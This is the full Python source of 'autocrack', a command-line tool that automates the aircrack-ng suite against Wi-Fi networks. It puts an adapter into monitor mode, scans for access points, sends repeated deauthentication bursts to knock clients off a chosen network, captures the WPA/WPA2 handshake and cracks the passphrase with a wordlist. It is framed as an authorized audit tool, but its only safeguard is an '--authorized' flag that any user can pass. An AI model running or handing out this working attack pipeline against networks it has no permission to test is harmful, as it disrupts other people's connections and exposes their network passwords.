#!/usr/bin/env python3
"""autocrack — an automated aircrack-ng workflow for *authorized* Wi-Fi audits.

This chains the aircrack-ng suite end to end with no manual steps:

    airmon-ng  -> monitor mode
    airodump-ng-> discover access points (and pick the target you own)
    airodump-ng-> targeted capture, while
    aireplay-ng-> deauth bursts force a client to re-handshake
    aircrack-ng-> crack the captured WPA/WPA2 handshake against a wordlist

It is a thin, testable orchestrator around the real aircrack-ng binaries.
It runs on **Linux** (the MediaTek MT7610U / ALFA AWUS036ACHM has monitor
mode + injection via the in-kernel `mt76x0u` driver; macOS does not support
this) and must be run as root.

> Only run this against a network you own or are explicitly authorized to
> test. Deauthentication and handshake capture against networks you do not
> control are illegal in most jurisdictions. The `--authorized` flag is a
> deliberate speed bump, not a license.
"""

from __future__ import annotations

import argparse
import re
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path

REQUIRED_TOOLS = ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng")


class AutocrackError(RuntimeError):
    """Base error for autocrack failures."""


class AuthorizationError(AutocrackError):
    """Raised when the run was not explicitly authorized."""


class ToolNotFoundError(AutocrackError):
    """Raised when a required aircrack-ng binary is not on PATH."""


class MonitorModeError(AutocrackError):
    """Raised when monitor mode could not be enabled."""


@dataclass(frozen=True)
class AccessPoint:
    bssid: str
    channel: str
    privacy: str
    power: str
    essid: str


@dataclass(frozen=True)
class AuditResult:
    bssid: str
    essid: str | None
    handshake_captured: bool
    key: str | None


# --- output parsing (pure, unit-tested) -----------------------------------


def parse_airodump_csv(text: str) -> list[AccessPoint]:
    """Parse an `airodump-ng --output-format csv` dump into access points.

    The CSV has two sections: access points, then a blank line and a
    "Station MAC" header for associated clients. Only the AP section is
    returned. Fields carry leading spaces and the file uses CRLF endings.
    """
    access_points: list[AccessPoint] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        if line.startswith("BSSID,"):
            continue
        if line.startswith("Station MAC"):
            break  # stations follow; stop.
        fields = [field.strip() for field in line.split(",")]
        if len(fields) < 14 or not _looks_like_mac(fields[0]):
            continue
        access_points.append(
            AccessPoint(
                bssid=fields[0],
                channel=fields[3],
                privacy=fields[5],
                power=fields[8],
                essid=fields[13],
            )
        )
    return access_points


_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")


def _looks_like_mac(value: str) -> bool:
    return bool(_MAC_RE.match(value))


_MONITOR_VIF_RE = re.compile(r"enabled for \[phy\d+\]\S+ on \[phy\d+\](?P<mon>\S+?)\)")


def parse_monitor_interface(airmon_output: str, requested: str) -> str:
    """Return the monitor interface airmon-ng created, or the requested one.

    Newer airmon-ng creates a separate `<iface>mon` vif and prints a line like
    "(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)".
    Some drivers instead switch the same interface into monitor mode in place,
    in which case we keep using the requested name.
    """
    match = _MONITOR_VIF_RE.search(airmon_output)
    if match:
        return match.group("mon")
    return requested


def scan_has_handshake(aircrack_output: str, bssid: str) -> bool:
    """True when `aircrack-ng <cap>` reports a captured handshake for bssid.

    aircrack-ng lists each network with e.g. "WPA (1 handshake)". We match the
    row for our BSSID and require a non-zero handshake count.
    """
    bssid = bssid.lower()
    for line in aircrack_output.splitlines():
        if bssid not in line.lower():
            continue
        match = re.search(r"\((\d+)\s+handshake", line)
        if match and int(match.group(1)) > 0:
            return True
    return False


_KEY_FOUND_RE = re.compile(r"KEY FOUND!\s*\[\s*(?P<key>.*?)\s*\]")


def parse_crack_key(aircrack_output: str) -> str | None:
    """Return the passphrase from an aircrack-ng "KEY FOUND! [ ... ]" line."""
    match = _KEY_FOUND_RE.search(aircrack_output)
    return match.group("key") if match else None


# --- orchestration --------------------------------------------------------


class WifiAuditor:
    """Drives the aircrack-ng suite through the full automated pipeline.

    Every external command goes through the injected `runner`/`popen`, and
    waiting through `sleep`, so the orchestration is unit-testable without a
    live radio.
    """

    def __init__(
        self,
        interface: str,
        workdir: str,
        authorized: bool,
        runner=subprocess.run,
        popen=subprocess.Popen,
        sleep=time.sleep,
    ) -> None:
        self.interface = interface
        self.workdir = Path(workdir)
        self.authorized = authorized
        self._runner = runner
        self._popen = popen
        self._sleep = sleep
        self.monitor: str | None = None

    def preflight(self) -> None:
        """Ensure every required aircrack-ng binary is installed."""
        for tool in REQUIRED_TOOLS:
            completed = self._runner(["which", tool], capture_output=True, text=True)
            if completed.returncode != 0:
                raise ToolNotFoundError(
                    f"'{tool}' not found on PATH. Install the aircrack-ng suite "
                    f"(e.g. `sudo apt install aircrack-ng`)."
                )

    def enable_monitor(self) -> str:
        completed = self._runner(
            ["airmon-ng", "start", self.interface], capture_output=True, text=True
        )
        self.monitor = parse_monitor_interface(completed.stdout, requested=self.interface)
        if not self.monitor:
            raise MonitorModeError(f"Could not enable monitor mode on {self.interface}.")
        return self.monitor

    def disable_monitor(self) -> None:
        if self.monitor:
            self._runner(["airmon-ng", "stop", self.monitor], capture_output=True, text=True)
            self.monitor = None

    def scan(self, seconds: int = 15) -> list[AccessPoint]:
        """Run a timed airodump-ng scan and parse the discovered access points."""
        prefix = self.workdir / "scan"
        cmd = [
            "airodump-ng",
            "--write", str(prefix),
            "--output-format", "csv",
            self.monitor or self.interface,
        ]
        try:
            self._runner(cmd, capture_output=True, text=True, timeout=seconds)
        except subprocess.TimeoutExpired:
            pass  # expected: airodump-ng runs until stopped.
        csv_path = self.workdir / "scan-01.csv"
        if not csv_path.exists():
            return []
        return parse_airodump_csv(csv_path.read_text(errors="replace"))

    def capture_handshake(
        self,
        bssid: str,
        channel: str,
        deauth_rounds: int = 4,
        poll_seconds: int = 5,
    ) -> tuple[Path, bool]:
        """Capture a WPA handshake for bssid, nudging clients with deauths.

        Runs a targeted airodump-ng in the background, then alternates deauth
        bursts with handshake-presence checks until one is captured or the
        deauth rounds are exhausted. Returns the capture path and whether a
        handshake was seen.
        """
        prefix = self.workdir / "handshake"
        cap_path = self.workdir / "handshake-01.cap"
        captured = False
        dump = self._popen(
            [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", channel,
                "--write", str(prefix),
                "--output-format", "pcap",
                self.monitor or self.interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            for _ in range(deauth_rounds):
                self._runner(
                    ["aireplay-ng", "--deauth", "5", "-a", bssid, self.monitor or self.interface],
                    capture_output=True,
                    text=True,
                )
                self._sleep(poll_seconds)
                if self._handshake_present(cap_path, bssid):
                    captured = True
                    break
        finally:
            dump.terminate()
            try:
                dump.wait(timeout=5)
            except Exception:
                pass
        return cap_path, captured

    def _handshake_present(self, cap_path: Path, bssid: str) -> bool:
        completed = self._runner(
            ["aircrack-ng", str(cap_path)], capture_output=True, text=True
        )
        return scan_has_handshake(completed.stdout, bssid)

    def crack(self, cap_path: Path, bssid: str, wordlist: str) -> str | None:
        completed = self._runner(
            ["aircrack-ng", "-w", wordlist, "-b", bssid, str(cap_path)],
            capture_output=True,
            text=True,
        )
        return parse_crack_key(completed.stdout)

    def run(
        self,
        bssid: str,
        channel: str,
        wordlist: str,
        deauth_rounds: int = 4,
        essid: str | None = None,
    ) -> AuditResult:
        """Run the full automated pipeline against a single target you own."""
        if not self.authorized:
            raise AuthorizationError(
                "Refusing to run without explicit authorization. Pass --authorized "
                "only for a network you own or are permitted to test."
            )
        self.preflight()
        self.enable_monitor()
        try:
            cap_path, captured = self.capture_handshake(
                bssid, channel, deauth_rounds=deauth_rounds
            )
            key = self.crack(cap_path, bssid, wordlist) if captured else None
        finally:
            self.disable_monitor()
        return AuditResult(bssid=bssid, essid=essid, handshake_captured=captured, key=key)


# --- CLI ------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="autocrack",
        description=(
            "Automated aircrack-ng workflow (monitor -> scan -> capture -> "
            "crack) for AUTHORIZED Wi-Fi audits on Linux."
        ),
    )
    parser.add_argument("--interface", required=True, help="Wi-Fi interface, e.g. wlan0")
    parser.add_argument("--wordlist", required=True, help="Path to a passphrase wordlist")
    parser.add_argument("--bssid", help="Target AP BSSID (skip interactive scan/select)")
    parser.add_argument("--channel", help="Target AP channel (required with --bssid)")
    parser.add_argument("--essid", help="Target AP ESSID (used to auto-resolve BSSID/channel)")
    parser.add_argument("--scan-time", type=int, default=15, help="Seconds to scan for APs")
    parser.add_argument("--deauth-rounds", type=int, default=4, help="Deauth/capture attempts")
    parser.add_argument(
        "--workdir", default="/tmp/autocrack", help="Directory for capture files"
    )
    parser.add_argument(
        "--authorized",
        action="store_true",
        help="Confirm you own or are permitted to test the target (required)",
    )
    return parser


def _select_target(auditor: WifiAuditor, args) -> tuple[str, str, str | None]:
    """Resolve the (bssid, channel, essid) to attack from args or a scan."""
    if args.bssid:
        if not args.channel:
            raise AutocrackError("--channel is required when --bssid is given.")
        return args.bssid, args.channel, args.essid

    print(f"[*] Scanning for {args.scan_time}s on {auditor.interface} ...", file=sys.stderr)
    access_points = auditor.scan(seconds=args.scan_time)
    if not access_points:
        raise AutocrackError("No access points found. Move closer or scan longer.")

    if args.essid:
        for ap in access_points:
            if ap.essid == args.essid:
                return ap.bssid, ap.channel, ap.essid
        raise AutocrackError(f"ESSID {args.essid!r} not seen in scan.")

    print("[!] Multiple APs found; pass --bssid/--channel or --essid to target one:", file=sys.stderr)
    for ap in access_points:
        print(f"    {ap.bssid}  ch {ap.channel:>3}  {ap.power:>4} dBm  {ap.privacy:<10} {ap.essid}", file=sys.stderr)
    raise AutocrackError("Refusing to auto-attack every network in range; choose a target.")


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    auditor = WifiAuditor(
        interface=args.interface, workdir=args.workdir, authorized=args.authorized
    )
    if not args.authorized:
        print(
            "[!] Refusing to run without --authorized. Only test networks you own "
            "or are explicitly permitted to test.",
            file=sys.stderr,
        )
        return 2

    auditor.workdir.mkdir(parents=True, exist_ok=True)
    try:
        auditor.preflight()
        bssid, channel, essid = _select_target(auditor, args)
        print(f"[*] Target {bssid} (ch {channel}) — capturing handshake ...", file=sys.stderr)
        result = auditor.run(
            bssid=bssid,
            channel=channel,
            wordlist=args.wordlist,
            deauth_rounds=args.deauth_rounds,
            essid=essid,
        )
    except AutocrackError as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1

    if not result.handshake_captured:
        print("[-] No handshake captured. Try more deauth rounds or a busier time.")
        return 1
    if result.key is None:
        print("[-] Handshake captured but passphrase not in wordlist.")
        return 1
    print(f"[+] KEY FOUND for {result.bssid}: {result.key}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
